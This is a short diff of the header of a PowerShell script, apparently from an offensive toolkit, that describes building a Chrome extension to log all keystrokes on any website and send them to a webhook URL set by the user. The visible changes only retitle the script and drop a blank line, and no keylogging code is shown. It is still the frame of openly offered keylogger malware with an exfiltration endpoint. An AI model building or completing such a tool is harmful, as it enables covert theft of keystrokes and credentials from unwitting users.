@@ -1,4 +1,4 @@
-<#==================================== Chrome Keylogger =======================================
+<#==================================== Install Chrome Keylogger Extension (manually) =======================================
 
 SYNOPSIS
 Creates the neccessary files for a chrome extension that logs all keystrokes on any website.
@@ -12,7 +12,6 @@ USAGE
 
 CREDIT
 Kudos and credit to jakov for the js code!
-
 #>
 
 $hookurl = "$dc" # YOUR_WEBHOOK_HERE
